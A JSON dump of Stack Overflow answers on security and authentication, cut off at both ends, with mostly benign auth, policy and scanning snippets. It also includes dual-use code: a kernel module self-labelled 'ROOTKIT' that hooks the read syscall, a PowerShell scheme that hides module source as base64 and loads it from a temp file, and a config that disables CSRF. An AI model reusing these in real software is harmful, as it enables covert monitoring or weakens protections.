{0}\",\n\t\t\tConvert.ToBase64String(digest));\n\t\tConsole.WriteLine(\"Signature of SHA256 of Payload: {0}\",\n\t\t\tConvert.ToBase64String(hashSignature));\n\t\tConsole.WriteLine(\"Verify RSA Signature of SHA256 Hash: {0}\",\n\t\t\tVerifyDigestSignature(digest,hashSignature));\n\t}\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2020-12-08T17:05:30",
        "author": "lwg-ga"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/64698817/is-this-example-of-model-object-property-usage-unique-to-a-logged-in-session-in",
    "title": "Is this example of model object property usage unique to a logged-in session in django?",
    "question_id": 64698817,
    "posted_date": "2020-11-05T09:03:50",
    "answers": [
      {
        "answer_id": 64714525,
        "body": "In [13]: from django.contrib.auth.models import User\nIn [14]: users = User.objects.all()\nIn [15]: u = users.first()\nIn [16]: u\nOut[16]: <User: super>\nIn [17]: u.tmp = 123\nIn [18]: u.tmp\nOut[18]: 123\nIn [19]: u2 = users.first()\nIn [20]: u2.tmp\n---------------------------------------------------------------------------\nAttributeError                            Traceback (most recent call last)\n<ipython-input-20-f4c979d08460> in <module>\n----> 1 u2.tmp\nAttributeError: 'User' object has no attribute 'tmp'",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2020-11-06T07:16:14",
        "author": "Anr"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/62939790/google-security-command-center-how-to-export-findings-in-json-format",
    "title": "Google Security Command Center - how to export findings in JSON format",
    "question_id": 62939790,
    "posted_date": "2020-07-16T12:58:56",
    "answers": [
      {
        "answer_id": 66952809,
        "body": "from google.cloud import securitycenter\nfrom google.cloud.securitycenter import ListFindingsResponse\n# Create a client.\nclient = securitycenter.SecurityCenterClient()\n# organization_id is the numeric ID of the organization. e.g.:\n# organization_id = \"111122222444\"\norg_name = \"organizations/{org_id}\".format(org_id=organization_id)\n# The \"sources/-\" suffix lists findings across all sources.  You\n# also use a specific source_name instead.\nall_sources = \"{org_name}/sources/-\".format(org_name=org_name)\nfinding_result_iterator = client.list_findings(all_sources)\nfor i, finding_result in enumerate(finding_result_iterator):\n    print(\n        ListFindingsResponse.ListFindingsResult.to_json(finding_result)\n    )\n    print(\n        \"{}: name: {} resource: {}\".format(\n            i, finding_result.finding.name, finding_result.finding.resource_name\n        )\n    )",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2021-04-05T08:08:07",
        "author": "Mohamed Serag Eldeen"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/62561500/bearer-is-for-the-authentication-token-but-is-for-a-different-token",
    "title": "bearer is for the authentication token but is for a different token?",
    "question_id": 62561500,
    "posted_date": "2020-06-24T14:11:02",
    "answers": [
      {
        "answer_id": 62564662,
        "body": "try {\n    const payload = verifyToken(jwtToken);\n} catch (err) {\n    // assuming if the verification failed because of invalid token will throw an error\n    return res.status(401).send(); // Unauthorized\n}\n// Check from roles array if it has \"ADMIN\" in it\nif ( payload.roles.includes(\"ADMIN\") ) {\n    adminOnlyFunction(); // Function that can be accessed by admin only\n    return res.status(200).send();\n} else {\n    // If user has no ADMIN roles, return 403 instead\n    return res.status(403).send(); // Forbidden\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2020-06-24T17:54:20",
        "author": "Owl"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/61467790/how-to-logout-on-401-using-a-fetch-client-for-data-queries",
    "title": "How to logout on 401 using a fetch client for data queries?",
    "question_id": 61467790,
    "posted_date": "2020-04-27T16:21:29",
    "answers": [
      {
        "answer_id": 61468271,
        "body": "// Private route HOC\nexport const PrivateRouteComponent = ({ component: Component, state: state, ...rest }) => {\n    const renderComponent = (props) => {\n        if (state.login.isLoggedIn) {\n            return <Component {...props} />;\n        } else {\n            return <Redirect to='/login' />;\n        }\n    };\n    return (\n      <Route\n        {...rest}\n        render={renderComponent}\n      />\n    );\n  };\n// REF: pluralsight connect container\nfunction mapStateToProps(state, ownProps) {\n    return {\n        state: {\n            login: state.authenticate\n        }\n    };\n}\nexport const PrivateRoute = connect(mapStateToProps)(PrivateRouteComponent);",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2020-04-27T16:53:26",
        "author": "MonteCristo"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/58765729/symfony-3-4-how-to-force-de-authentication",
    "title": "Symfony 3.4 : How to force de-authentication",
    "question_id": 58765729,
    "posted_date": "2019-11-08T06:30:44",
    "answers": [
      {
        "answer_id": 58771230,
        "body": "namespace AppBundle\\Security;\nuse AppBundle\\Security\\User as AppUser;\nuse Symfony\\Component\\Security\\Core\\User\\UserCheckerInterface;\nuse Symfony\\Component\\Security\\Core\\User\\UserInterface;\nclass UserChecker implements UserCheckerInterface\n{\n    public function checkPreAuth(UserInterface $user)\n    {\n        if (!$user instanceof AppUser) {\n            return;\n        }\n        if (!in_array('SOME_ROLE', $user->getRoles())) {\n            // throw an AccountStatusException exception here\n        }\n    }\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2019-11-08T12:24:25",
        "author": "Manu"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/58578339/how-can-i-restrict-the-access-to-a-static-file-to-a-specific-logged-in-user",
    "title": "How can I restrict the access to a static file to a specific logged in user?",
    "question_id": 58578339,
    "posted_date": "2019-10-27T06:04:19",
    "answers": [
      {
        "answer_id": 58586288,
        "body": "public class RestrictStaticFilesRequirement: AuthorizationHandler<RestrictStaticFilesRequirement>,IAuthorizationRequirement\n{\n    public const string DefaultPolicyName = \"Access-His-Own-Static-Files\";\n    protected override Task HandleRequirementAsync(AuthorizationHandlerContext context, RestrictStaticFilesRequirement requirement)\n    {\n        var user = context.User;                      // current User Principal\n        var userName = context.Resource as string;    // current userName\n        // custom this requirement as you like\n        if(user != null && !string.IsNullOrEmpty(userName) && user.HasClaim(ClaimTypes.NameIdentifier, userName)) {\n            context.Succeed(requirement);\n        } else {\n            context.Fail();\n        }\n        return Task.CompletedTask;\n    }\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2019-10-28T01:52:32",
        "author": "itminus"
      },
      {
        "answer_id": 58586288,
        "body": "app.UseAuthentication();\napp.UseWhen( ctx => ctx.Request.Path.StartsWithSegments(\"/files/users\"), appBuilder =>{\n    appBuilder.Use(async (context, next) => {\n        // get the userId in current Path : \"/files/users/{userId}/....\"\n        var userId = context.Request.Path.Value.Substring(\"/files/users/\".Length)\n            .Split('/')\n            .FirstOrDefault();\n        if(string.IsNullOrEmpty(userId)){\n            await next();    // current URL is not for static files\n            return;\n        }\n        var auth= context.RequestServices.GetRequiredService<IAuthorizationService>();\n        var result = await auth.AuthorizeAsync( context.User, userId ,RestrictStaticFilesRequirement.DefaultPolicyName);\n        if(!result.Succeeded){\n            context.Response.StatusCode= 403;\n            return;\n        }\n        await next();\n    });\n});\napp.UseStaticFiles();\n// ... other middlewares",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2019-10-28T01:52:32",
        "author": "itminus"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/56117749/missing-checkkeystore-in-jetty-9-4-sslcontextfactory",
    "title": "missing checkKeyStore() in jetty 9.4 SSLContextFactory",
    "question_id": 56117749,
    "posted_date": "2019-05-13T14:10:36",
    "answers": [
      {
        "answer_id": 56118046,
        "body": "import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport org.eclipse.jetty.util.IO;\nimport org.eclipse.jetty.util.StringUtil;\nimport org.eclipse.jetty.util.ssl.SslContextFactory;\nprivate static void check(SslContextFactory ssl) throws IOException\n{\n    if (ssl.getKeyStore() == null) // too late, already loaded?\n    {\n        if (StringUtil.isNotBlank(ssl.getKeyStorePath())) // no path, no check\n        {\n            Path keystorePath = Paths.get(ssl.getKeyStorePath());\n            try (InputStream inputStream = Files.newInputStream(keystorePath);\n                 OutputStream outputStream = new ByteArrayOutputStream())\n            {\n                IO.copy(inputStream, outputStream);\n            }\n        }\n    }\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2019-05-13T14:34:28",
        "author": "Joakim Erdfelt"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/55562046/spring-boot-security-doesnt-redirect-oauth-authorize-calls-on-configurehttpsec",
    "title": "Spring boot security doesn&#39;t redirect oauth/authorize calls on configure(HttpSecurity http) method",
    "question_id": 55562046,
    "posted_date": "2019-04-07T13:59:43",
    "answers": [
      {
        "answer_id": 55569392,
        "body": "public class ResourceServerConfiguration extends ResourceServerConfigurerAdapter {\n    @Override\n    public void configure(HttpSecurity http) throws Exception {\n      http.\n      .sessionManagement().sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)\n    \t.and()\n        .authorizeRequests()\n        .antMatchers(\"/oauth/token\", \"/oauth/authorize**\", \"/login**\", \"/user/recover_password\", \"/user/register\").permitAll()\n        .anyRequest().authenticated()\n        .and()\n        .formLogin()\n        .and()\n        .logout().logoutUrl(\"/oauth/logout\")\n        .and()\n        .csrf().disable();\n    }\n}",
        "score": 1,
        "is_accepted": true,
        "creation_date": "2019-04-08T04:43:13",
        "author": "Mellao"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/53287463/how-to-create-spring-security-login-page-in-vaadin-with-java-only",
    "title": "How to create spring security login page in vaadin with Java only?",
    "question_id": 53287463,
    "posted_date": "2018-11-13T13:34:43",
    "answers": [
      {
        "answer_id": 55425727,
        "body": "@Tag(\"sa-login-view\")\n@Route(value = LoginView.ROUTE)\n@PageTitle(\"Login\")\npublic class LoginView extends VerticalLayout {\n        public static final String ROUTE = \"login\";\n        private LoginOverlay login = new LoginOverlay(); // (1)\n        public LoginView(){\n            login.setAction(\"login\"); // (2)\n            login.setOpened(true); // (3)\n            login.setTitle(\"Spring Secured Vaadin\");\n            login.setDescription(\"Login Overlay Example\");\n            getElement().appendChild(login.getElement()); // (4)\n        }\n}",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2019-03-29T17:33:57",
        "author": "Paul Roemer"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/79489105/can-grype-tool-to-scan-a-purl",
    "title": "Can Grype tool to scan a PURL?",
    "question_id": 79489105,
    "posted_date": "2025-03-06T06:01:05",
    "answers": [
      {
        "answer_id": 79520195,
        "body": "git clone https://github.com/google/flatbuffers -b v23.1.21\ngrype ./flatbuffers\n\u2714 Indexed file system                                                                                                                                                                                                flatbuffers\n \u2714 Cataloged contents                                                                                                                                            e3c82e6c6bf71c090ee235f26b43aee9b40f120eb4652d8626c7cd714bead4fc\n   \u251c\u2500\u2500 \u2714 Packages                        [222 packages]\n   \u251c\u2500\u2500 \u2714 File digests                    [17 files]\n   \u251c\u2500\u2500 \u2714 File metadata                   [17 locations]\n   \u2514\u2500\u2500 \u2714 Executables                     [0 executables]\n \u2714 Scanned for vulnerabilities     [13 vulnerability matches]\n   \u251c\u2500\u2500 by severity: 0 critical, 7 high, 6 medium, 0 low, 0 negligible\n   \u2514\u2500\u2500 by status:   13 fixed, 0 not-fixed, 0 ignored\n[0000]  WARN no explicit name and version provided for directory source, deriving artifact ID from the given path (which is not ideal)\nNAME                    INSTALLED    FIXED-IN  TYPE       VULNERABILITY        SEVERITY\nbraces                  3.0.2        3.0.3     npm        GHSA-grv7-fg5c-xmjg  High\ncross-spawn             7.0.3        7.0.5     npm        GHSA-3xgq-45jj-v275  High\nesbuild                 0.16.4       0.25.0    npm        GHSA-67mh-4wv8-2f99  Medium\ngoogle.golang.org/grpc  v1.35.0      1.56.3    go-module  GHSA-m425-mq94-257g  High\ngoogle.golang.org/grpc  v1.35.0      1.56.3    go-module  GHSA-qppj-fm5r-hxr3  Medium\ngoogle.golang.org/grpc  v1.39.0-dev  1.56.3    go-module  GHSA-m425-mq94-257g  High\ngoogle.golang.org/grpc  v1.39.0-dev  1.56.3    go-module  GHSA-qppj-fm5r-hxr3  Medium\nmicromatch              4.0.5        4.0.8     npm        GHSA-952p-6rrq-rcjv  Medium\nsemver                  5.6.0        5.7.2     npm        GHSA-c2qf-rxjj-qqgw  High\nsemver                  7.3.7        7.5.2     npm        GHSA-c2qf-rxjj-qqgw  High\nword-wrap               1.2.3        1.2.4     npm        GHSA-j8xg-fqg3-53r7  Medium",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2025-03-19T08:29:38",
        "author": "popey"
      },
      {
        "answer_id": 79520195,
        "body": "wget https://repo1.maven.org/maven2/org/rogach/scallop_2.13/5.1.0/scallop_2.13-5.1.0-sources.jar\ngrype ./scallop_2.13-5.1.0-sources.jar\n \u2714 Indexed file system                                                                                                                                                                           ./scallop_2.13-5.1.0-sources.jar\n \u2714 Cataloged contents                                                                                                                                            79a24a3a5c54dd926ea9b41cc1258e58e395f25141c518b1c14afb869cb0bb9d\n   \u251c\u2500\u2500 \u2714 Packages                        [1 packages]\n   \u251c\u2500\u2500 \u2714 File digests                    [1 files]\n   \u251c\u2500\u2500 \u2714 File metadata                   [1 locations]\n   \u2514\u2500\u2500 \u2714 Executables                     [0 executables]\n \u2714 Scanned for vulnerabilities     [0 vulnerability matches]\n   \u251c\u2500\u2500 by severity: 0 critical, 0 high, 0 medium, 0 low, 0 negligible\n   \u2514\u2500\u2500 by status:   0 fixed, 0 not-fixed, 0 ignored\nNo vulnerabilities found",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2025-03-19T08:29:38",
        "author": "popey"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/79325519/how-to-redact-username-password-information-from-resttemplate-logs",
    "title": "How to redact username, password information from RestTemplate logs",
    "question_id": 79325519,
    "posted_date": "2025-01-02T23:44:59",
    "answers": [
      {
        "answer_id": 79326101,
        "body": "class CustomUrlEncodedBodyFilter implements BodyFilter {\n  private final Set<String> namesToObfuscate;\n  private static final Predicate<String> FORM_URL_ENCODED =\n      MediaTypeQuery.compile(\"application/x-www-form-urlencoded\");\n  public CustomUrlEncodedBodyFilter(Set<String> namesToObfuscate) {\n    this.namesToObfuscate = namesToObfuscate;\n  }\n  @Override\n  public String filter(@Nullable final String contentType, final String body) {\n    return FORM_URL_ENCODED.test(contentType) ? obfuscate(body) : body;\n  }\n  private String obfuscate(final String body) {\n    // Do the obfuscate here, ie parse body (should probably works with java.net.URL?) and replace values of items listed in namesToObfuscate\n    return body;\n  }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2025-01-03T05:02:50",
        "author": "Julien Antony"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/79197594/windows-removable-media-event-id-4656-not-reporting-all-information",
    "title": "Windows removable media event id 4656 not reporting all information",
    "question_id": 79197594,
    "posted_date": "2024-11-17T11:06:51",
    "answers": [
      {
        "answer_id": 79199611,
        "body": "$volumeLabelCache = @{}\nforeach ($eventXml in $events) {\n  $objectPath = $eventXml.SelectSingleNode('//Event/EventData/Data[@Name=\"ObjectName\"]').InnerText\n  $resolvedPath = $objectPath -replace '^\\\\Device\\\\HarddiskVolume(\\d+)\\\\',{\n    $partitionID = $_.Groups[1].Value\n    if (-not $volumeLabelCache.Contains($partitionID)) {\n      # cache volume label so we don't need to query the same partition id again\n      $volumeLabelCache[$partitionID] = (Get-Partition -PartitionNumber $partitionID).AccessPaths.Where({$_ -like '?:\\*'}, 'First')[0]\n      if (-not $volumeLabelCache[$partitionID]){\n        # looks like we failed to resolve mount point from partition id, return original path\n        return $_.Value\n      }\n    }\n    # ... otherwise replace partition part of the object path with volume label\n    return $volumeLabelCache[$partitionID]\n  }\n  Write-Host \"Resolved path '$resolvedPath' from '$objectPath'\"\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-11-18T05:44:21",
        "author": "Mathias R. Jessen"
      },
      {
        "answer_id": 79199611,
        "body": "[regex]::Replace($objectPath, '^\\\\Device\\\\HarddiskVolume(\\d+)\\\\', {\n    param($m)\n    $partitionID = $m.Groups[1].Value\n    if (-not $volumeLabelCache.Contains($partitionID)) {\n      # cache volume label so we don't need to query the same partition id again\n      $volumeLabelCache[$partitionID] = (Get-Partition -PartitionNumber $partitionID).AccessPaths.Where({$_ -like '?:\\*'}, 'First')[0]\n      if (-not $volumeLabelCache[$partitionID]){\n        # looks like we failed to resolve mount point from partition id, return original path\n        return $m.Value\n      }\n    }\n    # ... otherwise replace partition part of the object path with volume label\n    return $volumeLabelCache[$partitionID]\n  }",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-11-18T05:44:21",
        "author": "Mathias R. Jessen"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/79130687/how-can-i-protect-myself-from-nginx-botnet-requests",
    "title": "How can I protect myself from nginx botnet requests?",
    "question_id": 79130687,
    "posted_date": "2024-10-27T09:34:42",
    "answers": [
      {
        "answer_id": 79131035,
        "body": "127.0.0.1 - - [27/Oct/2024:16:28:17 +0000] \"GET /sdf HTTP/1.1\" 200 615 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\" \"-\"\n127.0.0.1 - - [27/Oct/2024:16:32:54 +0000] \"GET /foo/bar HTTP/1.1\" 200 615 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\" \"-\"\n127.0.0.1 - - [27/Oct/2024:16:32:58 +0000] \"GET /foo/baz HTTP/1.1\" 200 615 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\" \"-\"\n127.0.0.1 - - [27/Oct/2024:16:33:11 +0000] \"GET /some/really/long/path/that/doecnt/exist HTTP/1.1\" 200 615 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0\" \"-\"",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-10-27T12:39:21",
        "author": "Chris Doyle"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78860454/azure-policy-to-prevent-overly-permissive-nsg-rules-being-created",
    "title": "Azure Policy to prevent overly permissive NSG rules being created?",
    "question_id": 78860454,
    "posted_date": "2024-08-12T03:33:34",
    "answers": [
      {
        "answer_id": 78861113,
        "body": "{\n  \"mode\": \"All\",\n  \"policyRule\": {\n    \"if\": {\n      \"allOf\": [\n        {\n          \"field\": \"type\",\n          \"equals\": \"Microsoft.Network/networkSecurityGroups/securityRules\"\n        },\n        {\n          \"field\": \"Microsoft.Network/networkSecurityGroups/securityRules/access\",\n          \"equals\": \"Allow\"\n        },\n\t\t\t\t{\n          \"field\": \"Microsoft.Network/networkSecurityGroups/securityRules/direction\",\n          \"equals\": \"Inbound\"\n        },\n        {\n          \"anyOf\": [\n            {\n              \"field\": \"Microsoft.Network/networkSecurityGroups/securityRules/sourceAddressPrefix\",\n              \"equals\": \"*\"\n            },\n            {\n              \"field\": \"Microsoft.Network/networkSecurityGroups/securityRules/sourceAddressPrefix\",\n              \"equals\": \"0.0.0.0/0\"\n            }\n          ]\n        },\n        {\n          \"anyOf\": [\n            {\n              \"field\": \"Microsoft.Network/networkSecurityGroups/securityRules/destinationPortRange\",\n              \"equals\": \"3389\"\n            },\n            {\n              \"field\": \"Microsoft.Network/networkSecurityGroups/securityRules/destinationPortRange\",\n              \"equals\": \"22\"\n            },\n            {\n              \"field\": \"Microsoft.Network/networkSecurityGroups/securityRules/destinationPortRange\",\n              \"equals\": \"*\"\n            }\n          ]\n        }\n      ]\n    },\n    \"then\": {\n      \"effect\": \"deny\"\n    }\n  },\n  \"parameters\": {}\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-08-12T06:09:37",
        "author": "Venkat V"
      },
      {
        "answer_id": 78861113,
        "body": "{\n  \"mode\": \"All\",\n  \"policyRule\": {\n    \"if\": {\n      \"allOf\": [\n        {\n          \"field\": \"type\",\n          \"equals\": \"Microsoft.Security/locations/jitNetworkAccessPolicies\"\n        },\n        {\n          \"anyOf\": [\n            {\n              \"field\": \"Microsoft.Security/locations/jitNetworkAccessPolicies/virtualMachines[*].ports[*].number\",\n              \"equals\": \"3389\"\n            },\n            {\n              \"field\": \"Microsoft.Security/locations/jitNetworkAccessPolicies/virtualMachines[*].ports[*].number\",\n              \"equals\": \"22\"\n            },\n\t\t\t     {\n              \"field\": \"Microsoft.Security/locations/jitNetworkAccessPolicies/requests[*].virtualMachines[*].ports[*].number\",\n              \"equals\": \"22\"\n            },\n\t\t\t     {\n              \"field\": \"Microsoft.Security/locations/jitNetworkAccessPolicies/requests[*].virtualMachines[*].ports[*].number\",\n              \"equals\": \"3389\"\n            }\n          ]\n        }\n      ]\n    },\n    \"then\": {\n      \"effect\": \"deny\"\n    }\n  },\n  \"parameters\": {}\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-08-12T06:09:37",
        "author": "Venkat V"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78703073/how-to-setup-cors-and-requestmatchers-to-avoid-getting-403-forbidden-in-springbo",
    "title": "How to setup CORS and RequestMatchers to avoid getting 403 forbidden in SpringBoot 3.3",
    "question_id": 78703073,
    "posted_date": "2024-07-03T11:46:01",
    "answers": [
      {
        "answer_id": 78703106,
        "body": "  ...\n  .cors().configurationSource(corsConfigurationSource())\n  ...\n  @Bean\n  public CorsConfigurationSource corsConfigurationSource() {\n        CorsConfiguration configuration = new CorsConfiguration();\n        configuration.addAllowedOrigin(\"http://localhost:5174\");\n        configuration.addAllowedMethod(\"*\");\n        configuration.addAllowedHeader(\"*\");\n        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();\n        source.registerCorsConfiguration(\"/**\", configuration);\n        return source;\n  }",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-07-03T11:54:03",
        "author": "Mustafa Reda"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78693856/my-kernel-module-dont-hook-systems-calls-how-fix-that",
    "title": "My kernel-module dont hook systems-calls, how fix that?",
    "question_id": 78693856,
    "posted_date": "2024-07-01T14:57:59",
    "answers": [
      {
        "answer_id": 78697283,
        "body": "#include <linux/kprobes.h>\n#include <linux/ptrace.h>\nstatic int sys_read_kprobe_pre_handler(struct kprobe* p, struct pt_regs* regs)\n{\n    printk(KERN_NOTICE \"ROOTKIT: read(%ld, 0x%lx, 0x%lx)\\n\", regs->di, regs->si, regs->dx);\n    return 0;\n}\nstruct kprobe syscall_kprobe = {\n    .symbol_name = \"__x64_sys_read\",\n    .pre_handler = sys_read_kprobe_pre_handler,\n};\nstatic int __init startup(void)\n{\n    int err;\n    err = register_kprobe(&syscall_kprobe);\n    if (err) {\n        pr_err(\"register_kprobe() failed: %d\\n\", err);\n        return err;\n    }\n    printk(KERN_NOTICE \"ROOTKIT: Starting of due\");\n    return 0;\n}\nstatic void __exit shutdown(void)\n{\n    unregister_kprobe(&syscall_kprobe);\n    printk(KERN_NOTICE \"ROOTKIT: Ending\");\n}\nmodule_init(startup);\nmodule_exit(shutdown);\nMODULE_LICENSE(\"GPL\");",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-07-02T09:06:47",
        "author": "regens wesali"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78619642/powershell-function-security-to-limit-who-is-able-to-call-this-function-from-a",
    "title": "powershell function security to limit who is able to call this function - from allowed functions only?",
    "question_id": 78619642,
    "posted_date": "2024-06-13T14:39:16",
    "answers": [
      {
        "answer_id": 78621223,
        "body": "function New-Base64Module {\n   [CmdletBinding()]\n   param (\n      [Parameter(Mandatory = $true, Position = 0)]\n      [string]$Base64ModulePath,\n      [Parameter(Mandatory = $true, Position = 1)]\n      [string]$SourceModulePath\n   )\n   $Signature = '<#--Generated_Public_Base64_Module--#>'\n   if ((Test-Path $Base64ModulePath -PathType Leaf) -and (Get-Content -Raw -LiteralPath $Base64ModulePath) -notmatch $Signature) {\n      throw @\"\nThe module at '$Base64ModulePath' exists but is missing a valid signature.\nTo resolve this issue, you have the following options:\n1. Manually delete the existing module file and rerun the function to generate a new module.\n2. Correct the signature in the existing module file to match the expected signature.\n3. Or point this function to a previously generated module file that has the correct signature.\n\"@\n   }\n   else {\n      $ModuleCode = @'\n   {0}\n$PSCode = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{1}'))\n$tempModulePath = [System.IO.Path]::GetTempFileName()\n$tempModulePath = [System.IO.Path]::ChangeExtension($tempModulePath, '.psm1')\n$PSCode | Out-File -FilePath $tempModulePath -Encoding UTF8\nImport-Module -Name $tempModulePath\nRemove-Item -Path $tempModulePath\n{2}\n'@\n      $RegEx = '(?mi)(?<=^\\s*)export-modulemember\\s+.*?(?=\\s*$)'\n      $PSMod = (Get-Content -LiteralPath $SourceModulePath | Select-String $Regex -AllMatches).Matches.Value -join [Environment]::NewLine\n      $B64Str = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($SourceModulePath))\n      Set-Content -Path $Base64ModulePath -Value ($ModuleCode -f $Signature, $B64Str, $PSMod)\n   }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-06-14T01:40:08",
        "author": "Darin"
      },
      {
        "answer_id": 78621223,
        "body": "function Get-CallerScriptName {\n   $ThisFile = $MyInvocation.ScriptName\n   $Index = 0\n   $ParentFile = ''\n   do {\n      $ParentFile = (Get-PSCallStack)[++$Index].ScriptName\n   } until ( $ParentFile -ne $ThisFile  )\n   return $ParentFile\n}\nfunction Get-CallerPSScriptRoot {\n   Split-Path -Path (Get-CallerScriptName) -Parent\n}\nfunction Write-LogEntry([string]$Entry) {\n   $CallerPSScriptRoot = Get-CallerPSScriptRoot\n   $Entry | Out-File -LiteralPath \"$CallerPSScriptRoot\\Entries.log\" -Append\n}\nExport-ModuleMember -Function Write-LogEntry",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-06-14T01:40:08",
        "author": "Darin"
      },
      {
        "answer_id": 78621223,
        "body": "function Add-Base64PowerShell {\n   [CmdletBinding()]\n   param (\n      [Parameter(Mandatory = $true, Position = 0)]\n      [string]$PSModulePath,\n      [Parameter(Mandatory = $true, Position = 1)]\n      [string]$PSSourcePath,\n      [Parameter(Mandatory = $false, Position = 2)]\n      [string]$PSCodeVar = 'Base64'\n   )\n   $RegEx = \"(?mi)(?<=^\\s*\\x24$PSCodeVar\\s*=\\s*')([^\\r\\n']|'')*(?='\\s*$)\"\n   $B64Str = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($PSSourcePath))\n   $PSModText = (Get-Content -Raw -LiteralPath $PSModulePath) -replace $RegEx, $B64Str\n   Set-Content -Path $PSModulePath -Value $PSModText\n}\nAdd-Base64PowerShell \"$PSScriptRoot\\OneFileWithSecretPS1.psm1\" \"$PSScriptRoot\\ModuleSourceCode.psm1\"",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2024-06-14T01:40:08",
        "author": "Darin"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78542275/powershell-or-azurecli-command-to-enable-microsoft-defender-for-sql",
    "title": "Powershell or AzureCLI command to enable Microsoft Defender for SQL",
    "question_id": 78542275,
    "posted_date": "2024-05-28T02:33:06",
    "answers": [
      {
        "answer_id": 78555443,
        "body": "$SubscriptionId = '<your-sub-id>'\n$ResourceGroupName = '<your-resoruce-group-name>'\n$ServerName = '<your-server-name>'\nparam\n(\n    [Parameter(Mandatory = $True)]\n    [string]$SubscriptionId,\n    [Parameter(Mandatory = $True)]\n    [string]$ResourceGroupName,\n    [Parameter(Mandatory = $True)]\n    [string]$ServerName,\n    [Parameter(Mandatory = $False)]\n    [switch]$Force\n)\nfunction SetSqlVulnerabilityAssessmentServerSetting($SubscriptionId, $ResourceGroupName, $ServerName) {\n    $Uri = \"/subscriptions/$SubscriptionId/resourceGroups/$ResourceGroupName/providers/Microsoft.Sql/servers/$ServerName/sqlVulnerabilityAssessments/default?api-version=2022-02-01-preview\"\n\n\t$Body = @{\n        properties = @{\n            state = \"Enabled\"\n        }\n    }\n    $Body = $Body | ConvertTo-Json\n    return SendRestRequest -Method \"Put\" -Uri $Uri -Body $Body\n}\nfunction SendRestRequest(\n    [Parameter(Mandatory = $True)]\n    [string] $Method,\n    [Parameter(Mandatory = $True)]\n    [string] $Uri,\n    [parameter( Mandatory = $false )]\n    [string] $Body = \"DEFAULT\") {\n    $Params = @{\n        Method       = $Method\n        Path         = $Uri\n    }\n    if (!($Body -eq \"DEFAULT\")) {\n        $Params = @{\n            Method       = $Method\n            Path         = $Uri\n            Payload      = $Body\n        }\n    }\n    Invoke-AzRestMethod @Params\n}\nSetSqlVulnerabilityAssessmentServerSetting -SubscriptionId $SubscriptionId -ResourceGroupName $ResourceGroupName -ServerName $ServerName",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2024-05-30T09:55:04",
        "author": "Alin Dumitru"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/78289800/grails-6-1-2-gives-unmatched-argument-at-index-0-when-trying-to-run-commands",
    "title": "Grails 6.1.2 gives &quot;Unmatched argument at index 0&quot; when trying to run commands",
    "question_id": 78289800,
    "posted_date": "2024-04-07T21:18:17",
    "answers": [
      {
        "answer_id": 78308196,
